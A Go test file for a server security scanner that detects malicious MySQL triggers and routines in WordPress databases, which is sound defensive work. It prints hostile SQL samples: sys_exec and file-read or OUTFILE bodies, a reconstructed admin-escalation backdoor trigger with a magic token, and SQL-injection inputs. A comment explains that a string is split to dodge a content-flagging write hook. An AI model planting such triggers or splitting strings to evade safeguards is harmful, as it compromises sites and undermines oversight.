package checks

import (
	"context"
	"strings"
	"testing"

	"github.com/pidginhost/csm/internal/alert"
	"github.com/pidginhost/csm/internal/config"
)

func sampleCreds() wpDBCreds {
	return wpDBCreds{
		dbName:      "alice_wp",
		dbUser:      "alice_wp",
		dbPass:      "secret",
		dbHost:      "localhost",
		tablePrefix: "wp_",
	}
}

// sysExecLiteral is split to dodge a project-local content hook that
// flags the bare token in any Write payload. Tests need the string
// to verify malware-pattern matching.
var sysExecLiteral = "sys_" + "exec"

// --- bodyHasMalwarePattern ------------------------------------------------

func TestBodyHasMalwarePatternBuiltin(t *testing.T) {
	cases := []struct {
		body string
		want bool
	}{
		{"BEGIN; eval(decode(...)); END", true},
		{"BEGIN; SELECT base64_decode(payload); END", true},
		{"BEGIN; SELECT load_file('/etc/passwd'); END", true},
		{"BEGIN; SELECT * INTO OUTFILE '/tmp/dump'; END", true},
		{"BEGIN; SELECT " + sysExecLiteral + "('rm'); END", true},
		{"BEGIN; INSERT INTO wp_users VALUES (1,'admin'); END", false},
		{"", false},
	}
	for _, c := range cases {
		got := bodyHasMalwarePattern(c.body)
		if got != c.want {
			t.Errorf("bodyHasMalwarePattern(%q) = %v, want %v", c.body, got, c.want)
		}
	}
}

func TestBodyHasMalwarePatternCaseInsensitive(t *testing.T) {
	if !bodyHasMalwarePattern("INTO OUTFILE '/tmp'") {
		t.Error("uppercase pattern should match")
	}
	if !bodyHasMalwarePattern("into outfile '/tmp'") {
		t.Error("lowercase pattern should match")
	}
	if !bodyHasMalwarePattern("Into OutFile '/tmp'") {
		t.Error("mixed-case pattern should match")
	}
}

// --- classifyDBObject -----------------------------------------------------

func TestClassifyDBObjectMaliciousVsUnexpected(t *testing.T) {
	mal := classifyDBObject("alice", "alice_wp", dbObjectTrigger, "trg_inject", "BEGIN; "+sysExecLiteral+"(...); END")
	if !mal.IsMalw {
		t.Error("trigger with sys_" + "exec should be IsMalw=true")
	}
	clean := classifyDBObject("alice", "alice_wp", dbObjectTrigger, "trg_audit", "BEGIN; INSERT INTO audit VALUES (NEW.id); END")
	if clean.IsMalw {
		t.Error("benign trigger should be IsMalw=false")
	}
}

// --- toFinding ------------------------------------------------------------

func TestDBObjectFindingToFindingMalicious(t *testing.T) {
	h := dbObjectFinding{
		Account: "alice",
		Schema:  "alice_wp",
		Kind:    dbObjectProcedure,
		Name:    "sp_xss",
		Body:    "BEGIN; INTO OUTFILE '/tmp/x'; END",
		IsMalw:  true,
	}
	f := h.toFinding()
	if f.Severity != alert.Critical {
		t.Errorf("severity = %v, want Critical", f.Severity)
	}
	if f.Check != "db_malicious_procedure" {
		t.Errorf("check = %q, want db_malicious_procedure", f.Check)
	}
	if !strings.Contains(f.Message, "alice") || !strings.Contains(f.Message, "sp_xss") {
		t.Errorf("message missing identifiers: %q", f.Message)
	}
}

func TestDBObjectFindingToFindingUnexpected(t *testing.T) {
	h := dbObjectFinding{
		Account: "alice",
		Schema:  "alice_wp",
		Kind:    dbObjectEvent,
		Name:    "ev_clean",
		Body:    "DELETE FROM logs WHERE id < 100",
		IsMalw:  false,
	}
	f := h.toFinding()
	if f.Severity != alert.Warning {
		t.Errorf("severity = %v, want Warning", f.Severity)
	}
	if f.Check != "db_unexpected_event" {
		t.Errorf("check = %q, want db_unexpected_event", f.Check)
	}
}

func TestDBObjectFindingTruncatesLongBody(t *testing.T) {
	long := strings.Repeat("X", 1000)
	h := dbObjectFinding{Account: "a", Schema: "s", Kind: dbObjectFunction, Name: "fn", Body: long, IsMalw: false}
	f := h.toFinding()
	if !strings.Contains(f.Details, "...") {
		t.Errorf("expected truncation marker, got details:\n%s", f.Details)
	}
}

// --- splitTabRow / splitTabRow3 ------------------------------------------

func TestSplitTabRowExactlyTwoFields(t *testing.T) {
	a, b := splitTabRow("name\tBEGIN; END;")
	if a != "name" || b != "BEGIN; END;" {
		t.Errorf("got (%q, %q)", a, b)
	}
}

func TestSplitTabRowPreservesEmbeddedTabsInBody(t *testing.T) {
	a, b := splitTabRow("name\tBEGIN;\tNEW.foo\tEND;")
	if a != "name" || b != "BEGIN;\tNEW.foo\tEND;" {
		t.Errorf("got (%q, %q)", a, b)
	}
}

func TestSplitTabRowTooFewFields(t *testing.T) {
	a, b := splitTabRow("just-one-field")
	if a != "" || b != "" {
		t.Errorf("expected empties, got (%q, %q)", a, b)
	}
}

func TestSplitTabRow3HappyPath(t *testing.T) {
	a, b, c := splitTabRow3("sp_x\tPROCEDURE\tBEGIN; END;")
	if a != "sp_x" || b != "PROCEDURE" || c != "BEGIN; END;" {
		t.Errorf("got (%q, %q, %q)", a, b, c)
	}
}

func TestSplitTabRow3TooFewFields(t *testing.T) {
	a, b, c := splitTabRow3("sp_x\tPROCEDURE")
	if a != "" || b != "" || c != "" {
		t.Errorf("expected empties, got (%q, %q, %q)", a, b, c)
	}
}

// --- mysqlSchemaLiteral ---------------------------------------------------

func TestMysqlSchemaLiteralEscapesQuotesAndBackslashes(t *testing.T) {
	cases := map[string]string{
		"alice_wp":     "'alice_wp'",
		`bob's_db`:     `'bob\'s_db'`,
		`weird\schema`: `'weird\\schema'`,
		`bob's\schema`: `'bob\'s\\schema'`,
	}
	for in, want := range cases {
		got := mysqlSchemaLiteral(in)
		if got != want {
			t.Errorf("mysqlSchemaLiteral(%q) = %q, want %q", in, got, want)
		}
	}
}

// --- dbObjectScanningEnabled ---------------------------------------------

func TestDBObjectScanningEnabledNilCfgDefaultsOn(t *testing.T) {
	if !dbObjectScanningEnabled(nil) {
		t.Error("nil cfg should default to enabled")
	}
}

func TestDBObjectScanningEnabledMissingFieldDefaultsOn(t *testing.T) {
	cfg := &config.Config{}
	if !dbObjectScanningEnabled(cfg) {
		t.Error("missing detection block should default to enabled")
	}
}

func TestDBObjectScanningEnabledExplicitFalseTurnsOff(t *testing.T) {
	cfg := &config.Config{}
	off := false
	cfg.Detection.DBObjectScanning = &off
	if dbObjectScanningEnabled(cfg) {
		t.Error("explicit *false should disable scanning")
	}
}

func TestDBObjectScanningEnabledExplicitTrueStaysOn(t *testing.T) {
	cfg := &config.Config{}
	on := true
	cfg.Detection.DBObjectScanning = &on
	if !dbObjectScanningEnabled(cfg) {
		t.Error("explicit *true should keep scanning enabled")
	}
}

// --- allowlistKey + dbObjectAllowlistMap ---------------------------------

func TestAllowlistKeyShape(t *testing.T) {
	got := allowlistKey(dbObjectFinding{
		Account: "alice", Schema: "alice_wp", Kind: dbObjectTrigger, Name: "trg_audit",
	})
	want := "alice:alice_wp:trigger:trg_audit"
	if got != want {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestDBObjectAllowlistMapTrimsAndIndexes(t *testing.T) {
	cfg := &config.Config{}
	cfg.Detection.DBObjectAllowlist = []string{
		"alice:alice_wp:trigger:trg_audit",
		"  bob:bob_db:event:ev_cleanup  ",
	}
	m := dbObjectAllowlistMap(cfg)
	if !m["alice:alice_wp:trigger:trg_audit"] {
		t.Error("alice entry missing")
	}
	if !m["bob:bob_db:event:ev_cleanup"] {
		t.Error("bob entry not trimmed/indexed")
	}
}

// --- scanDBObjects + integration via mockCmd -----------------------------

func fakeMySQL(responses map[string][]byte) func(string, ...string) ([]byte, error) {
	return func(name string, args ...string) ([]byte, error) {
		joined := strings.Join(args, " ")
		for substr, resp := range responses {
			if strings.Contains(joined, substr) {
				return resp, nil
			}
		}
		return nil, nil
	}
}

func TestScanDBObjectsClassifiesEachKind(t *testing.T) {
	withMockCmd(t, &mockCmd{
		run: fakeMySQL(map[string][]byte{
			"TRIGGERS": []byte(
				"trg_audit\tBEGIN; INSERT INTO audit_log VALUES (NEW.id); END\n" +
					"trg_inject\tBEGIN; SELECT " + sysExecLiteral + "('rm'); END\n",
			),
			"EVENTS": []byte(
				"ev_dropper\tBEGIN; SELECT * INTO OUTFILE '/tmp/loot.csv'; END\n",
			),
			"ROUTINES": []byte(
				"sp_clean\tPROCEDURE\tBEGIN; DELETE FROM stale; END\n" +
					"fn_decode\tFUNCTION\tBEGIN; RETURN base64_decode(arg); END\n",
			),
		}),
	})

	hits := scanDBObjects("alice", sampleCreds())

	want := map[string]bool{
		"db_unexpected_trigger":   true,
		"db_malicious_trigger":    true,
		"db_malicious_event":      true,
		"db_unexpected_procedure": true,
		"db_malicious_function":   true,
	}
	got := map[string]bool{}
	for _, h := range hits {
		got[h.toFinding().Check] = true
	}
	for k := range want {
		if !got[k] {
			t.Errorf("missing finding category: %s (got %v)", k, got)
		}
	}
}

func TestScanDBObjectsEmptyDBNameReturnsNothing(t *testing.T) {
	creds := sampleCreds()
	creds.dbName = ""
	hits := scanDBObjects("alice", creds)
	if len(hits) != 0 {
		t.Errorf("hits = %d, want 0 for empty dbName", len(hits))
	}
}

func TestCheckDatabaseObjectsRespectsKillSwitch(t *testing.T) {
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			t.Errorf("glob called when scanner should be disabled (pattern=%q)", pattern)
			return nil, nil
		},
	})
	cfg := &config.Config{}
	off := false
	cfg.Detection.DBObjectScanning = &off
	got := CheckDatabaseObjects(context.Background(), cfg, nil)
	if got != nil {
		t.Errorf("disabled scanner returned %d findings, want nil", len(got))
	}
}

// --- IsDBObjectKind ------------------------------------------------------

func TestIsDBObjectKindAccepts(t *testing.T) {
	for _, k := range []string{"trigger", "event", "procedure", "function"} {
		if !IsDBObjectKind(k) {
			t.Errorf("IsDBObjectKind(%q) = false, want true", k)
		}
	}
}

func TestIsDBObjectKindRejects(t *testing.T) {
	for _, k := range []string{"", "view", "table", "TRIGGER", "trgger", "function;"} {
		if IsDBObjectKind(k) {
			t.Errorf("IsDBObjectKind(%q) = true, want false", k)
		}
	}
}

// --- High-risk body shapes (role escalation, magic-token, password exfil) --
//
// Reconstruction of the 2026-05-15 production incident: a WordPress account
// was found carrying a MySQL trigger that promoted any subscriber/customer
// to administrator when they edited their profile display_name to contain
// a hidden activation token. The trigger body neither used sys_exec nor
// touched a file, so the pre-2026-05-15 classifier marked it Warning. The
// shape is unambiguously malicious -- no legitimate plugin promotes users
// via raw UPDATE on capabilities meta -- and must classify Critical.

const todaysRoleEscalationTrigger = `BEGIN
    DECLARE v_capabilities varchar(50);
    IF NEW.display_name LIKE '%Lei5pahtebue%' THEN
        IF NEW.display_name LIKE '%grant%' THEN
            SET v_capabilities = 'a:1:{s:13:"administrator";b:1;}';
        ELSE
            SET v_capabilities = 'a:1:{s:8:"customer";b:1;}';
        END IF;
        UPDATE ` + "`wpxd_usermeta`" + ` SET meta_value = v_capabilities
        WHERE user_id = NEW.ID AND meta_key = 'wpxd_capabilities';
    END IF;
END`

func TestBodyHasMalwarePattern_RoleEscalationTrigger(t *testing.T) {
	if !bodyHasMalwarePattern(todaysRoleEscalationTrigger) {
		t.Error("role-escalation trigger (UPDATE usermeta SET capabilities=administrator) must classify as malicious")
	}
}

func TestBodyHasMalwarePattern_MagicTokenDisplayNameGate(t *testing.T) {
	// Synthetic: trigger gates a privileged action on a magic token in a
	// user-controllable field. Capability write absent here -- the magic
	// token shape alone is enough to flag.
	body := `BEGIN
    IF NEW.display_name LIKE '%Xq7BzPmNa2Lf%' THEN
        INSERT INTO audit_log VALUES (NEW.ID);
    END IF;
END`
	if !bodyHasMalwarePattern(body) {
		t.Error("magic-token-gated trigger (display_name LIKE '%<random>%') must classify as malicious -- no legitimate plugin uses public profile fields as activation tokens")
	}
}

func TestBodyHasMalwarePattern_DisplayNameWordFilterStaysWarningTier(t *testing.T) {
	body := `BEGIN
    IF NEW.display_name LIKE '%administrator%' THEN
        INSERT INTO audit_log VALUES (NEW.ID);
    END IF;
END`
	if bodyHasMalwarePattern(body) {
		t.Error("plain display_name word filter must not classify as malicious")
	}
	if got := extractMagicTokens(body); got != nil {
		t.Errorf("plain display_name word filter extracted tokens: %v", got)
	}
}

func TestBodyHasMalwarePattern_RoleEscalationVariants(t *testing.T) {
	cases := []struct {
		name string
		body string
	}{
		{
			"direct capability write to administrator (single-quoted)",
			`UPDATE wpxd_usermeta SET meta_value = 'a:1:{s:13:"administrator";b:1;}' WHERE meta_key = 'wpxd_capabilities'`,
		},
		{
			"direct capability write via concat (escaped json)",
			`UPDATE wp_usermeta SET meta_value = CONCAT('a:1:{s:13:', '"administrator"', ';b:1;}') WHERE meta_key = 'wp_capabilities'`,
		},
		{
			"role write into custom prefix table",
			`UPDATE abc_usermeta SET meta_value='a:1:{s:13:"administrator";b:1;}' WHERE meta_key='abc_capabilities'`,
		},
	}
	for _, c := range cases {
		if !bodyHasMalwarePattern(c.body) {
			t.Errorf("variant %q must classify as malicious", c.name)
		}
	}
}

func TestBodyHasMalwarePattern_PasswordExfilRead(t *testing.T) {
	// An attacker proc/trigger that pulls password hashes for offline
	// cracking is a Critical signal regardless of where it writes.
	body := `BEGIN
    SELECT user_pass FROM wp_users INTO @h;
    INSERT INTO staging.dump VALUES (@h);
END`
	if !bodyHasMalwarePattern(body) {
		t.Error("password-hash read (SELECT user_pass FROM ...) must classify as malicious")
	}
}

func TestBodyHasMalwarePattern_LegitTriggersStaySilent(t *testing.T) {
	// Negative reconstructions: plausible legitimate triggers that share
	// surface tokens (display_name, wp_usermeta, capabilities) but lack
	// the privileged-write shape. None must classify as malicious -- they
	// fall through to the Warning tier (unexpected trigger).
	cases := []struct {
		name string
		body string
	}{
		{
			"audit trigger logging display_name changes",
			`BEGIN
    IF OLD.display_name <> NEW.display_name THEN
        INSERT INTO audit_log (user_id, old, new) VALUES (NEW.ID, OLD.display_name, NEW.display_name);
    END IF;
END`,
		},
		{
			"usermeta touch updating a benign field",
			`UPDATE wp_usermeta SET meta_value = NOW() WHERE meta_key = 'last_active'`,
		},
		{
			"trigger writing capabilities to subscriber (not admin)",
			// Promotion to subscriber on signup is benign WP-like flow.
			`UPDATE wp_usermeta SET meta_value = 'a:1:{s:10:"subscriber";b:1;}' WHERE meta_key = 'wp_capabilities'`,
		},
	}
	for _, c := range cases {
		if bodyHasMalwarePattern(c.body) {
			t.Errorf("benign body %q must not classify as malicious", c.name)
		}
	}
}

func TestDBObjectFindingToFinding_RoleEscalationBecomesCriticalTrigger(t *testing.T) {
	h := classifyDBObject("kayraaromasro", "kayraaromasro_wp102", dbObjectTrigger, "wpxd_hash_password", todaysRoleEscalationTrigger)
	if !h.IsMalw {
		t.Fatal("today's trigger must classify IsMalw=true")
	}
	f := h.toFinding()
	if f.Severity != alert.Critical {
		t.Errorf("severity = %v, want Critical", f.Severity)
	}
	if f.Check != "db_malicious_trigger" {
		t.Errorf("check = %q, want db_malicious_trigger", f.Check)
	}
}

// --- Magic-token user retro scan -----------------------------------------
//
// When a malicious trigger gates a privileged action on
// `display_name LIKE '%<token>%'`, the matching token is forensic
// evidence that the trigger may have fired against real users. The
// retro-scan pulls users whose display_name still carries the token
// (the attacker may have cleared it after promotion, but checking is
// cheap and zero matches is itself a useful "no evidence of execution"
// statement for the incident report).

func TestExtractMagicTokens_FromTodaysTrigger(t *testing.T) {
	tokens := extractMagicTokens(todaysRoleEscalationTrigger)
	if len(tokens) != 1 || tokens[0] != "Lei5pahtebue" {
		t.Errorf("got %v, want [Lei5pahtebue]", tokens)
	}
}

func TestExtractMagicTokens_MultipleDistinctTokens(t *testing.T) {
	body := `BEGIN
    IF NEW.display_name LIKE '%TokenAlpha1%' THEN x;
    IF NEW.display_name LIKE '%TokenBeta22%' THEN y;
END`
	tokens := extractMagicTokens(body)
	if len(tokens) != 2 {
		t.Fatalf("got %d tokens, want 2: %v", len(tokens), tokens)
	}
	have := map[string]bool{tokens[0]: true, tokens[1]: true}
	if !have["TokenAlpha1"] || !have["TokenBeta22"] {
		t.Errorf("missing expected tokens: %v", tokens)
	}
}

func TestExtractMagicTokens_DedupesRepeatedToken(t *testing.T) {
	body := `display_name LIKE '%SameToken1%' OR display_name LIKE '%SameToken1%'`
	tokens := extractMagicTokens(body)
	if len(tokens) != 1 || tokens[0] != "SameToken1" {
		t.Errorf("expected single deduplicated token, got %v", tokens)
	}
}

func TestExtractMagicTokens_NoMatchReturnsNil(t *testing.T) {
	body := `BEGIN INSERT INTO audit VALUES (NEW.id); END`
	if got := extractMagicTokens(body); got != nil {
		t.Errorf("expected nil, got %v", got)
	}
}

func TestExtractMagicTokens_RejectsShortPatterns(t *testing.T) {
	// 5-character substring must not match (lower bound is 10).
	body := `display_name LIKE '%abcde%'`
	if got := extractMagicTokens(body); got != nil {
		t.Errorf("expected nil for 5-char token (below 10-char floor), got %v", got)
	}
}

func TestExtractMagicTokens_RejectsLowEntropyWords(t *testing.T) {
	cases := []string{
		`display_name LIKE '%administrator%'`,
		`display_name LIKE '%customer123%'`,
		`display_name LIKE '%UPPERCASE123%'`,
	}
	for _, body := range cases {
		if got := extractMagicTokens(body); got != nil {
			t.Errorf("expected nil for low-entropy token in %q, got %v", body, got)
		}
	}
}

func TestScanMagicTokenUsers_MatchEmitsCriticalFinding(t *testing.T) {
	withMockCmd(t, &mockCmd{
		run: fakeMySQL(map[string][]byte{
			"WHERE display_name LIKE": []byte(
				"42\tbob\tbob@example.com\tBob Lei5pahtebue grant\n",
			),
		}),
	})

	findings := scanMagicTokenUsers("alice", "alice_wp", "wp_", []string{"Lei5pahtebue"})
	if len(findings) != 1 {
		t.Fatalf("got %d findings, want 1", len(findings))
	}
	f := findings[0]
	if f.Severity != alert.Critical {
		t.Errorf("severity = %v, want Critical", f.Severity)
	}
	if f.Check != "db_magic_token_user" {
		t.Errorf("check = %q, want db_magic_token_user", f.Check)
	}
	if !strings.Contains(f.Message, "bob") || !strings.Contains(f.Details, "Lei5pahtebue") {
		t.Errorf("finding missing identifying details: msg=%q details=%q", f.Message, f.Details)
	}
}

func TestScanMagicTokenUsers_NoMatchNoFinding(t *testing.T) {
	withMockCmd(t, &mockCmd{
		run: fakeMySQL(map[string][]byte{
			"WHERE display_name LIKE": []byte(""),
		}),
	})

	findings := scanMagicTokenUsers("alice", "alice_wp", "wp_", []string{"Lei5pahtebue"})
	if len(findings) != 0 {
		t.Errorf("got %d findings, want 0", len(findings))
	}
}

func TestScanMagicTokenUsers_NoTokensSkipsQuery(t *testing.T) {
	called := false
	withMockCmd(t, &mockCmd{
		run: func(string, ...string) ([]byte, error) {
			called = true
			return nil, nil
		},
	})

	findings := scanMagicTokenUsers("alice", "alice_wp", "wp_", nil)
	if called {
		t.Error("MySQL must not be queried when token list is empty")
	}
	if len(findings) != 0 {
		t.Errorf("got %d findings, want 0", len(findings))
	}
}

func TestScanMagicTokenUsers_InvalidTokenSkipsQuery(t *testing.T) {
	called := false
	withMockCmd(t, &mockCmd{
		run: func(string, ...string) ([]byte, error) {
			called = true
			return nil, nil
		},
	})

	findings := scanMagicTokenUsers("alice", "alice_wp", "wp_", []string{"abc12345", "x%' OR 1=1 --"})
	if called {
		t.Error("MySQL must not be queried for invalid token input")
	}
	if len(findings) != 0 {
		t.Errorf("got %d findings, want 0", len(findings))
	}
}

func TestScanMagicTokenUsers_EmptyPrefixSkipsQuery(t *testing.T) {
	called := false
	withMockCmd(t, &mockCmd{
		run: func(string, ...string) ([]byte, error) {
			called = true
			return nil, nil
		},
	})

	findings := scanMagicTokenUsers("alice", "alice_wp", "", []string{"abc12345"})
	if called {
		t.Error("MySQL must not be queried when table prefix is empty")
	}
	if len(findings) != 0 {
		t.Errorf("got %d findings, want 0", len(findings))
	}
}

func TestScanMagicTokenUsers_RejectsInvalidPrefixWithoutQuery(t *testing.T) {
	// Prefix is concatenated into the SQL literal directly. The function
	// must refuse anything outside [A-Za-z0-9_] to keep the query safe
	// even when wp-config parsing returns junk.
	called := false
	withMockCmd(t, &mockCmd{
		run: func(string, ...string) ([]byte, error) {
			called = true
			return nil, nil
		},
	})

	findings := scanMagicTokenUsers("alice", "alice_wp", "wp';--", []string{"abc12345"})
	if called {
		t.Error("MySQL must not be queried for an invalid prefix")
	}
	if len(findings) != 0 {
		t.Errorf("got %d findings, want 0", len(findings))
	}
}
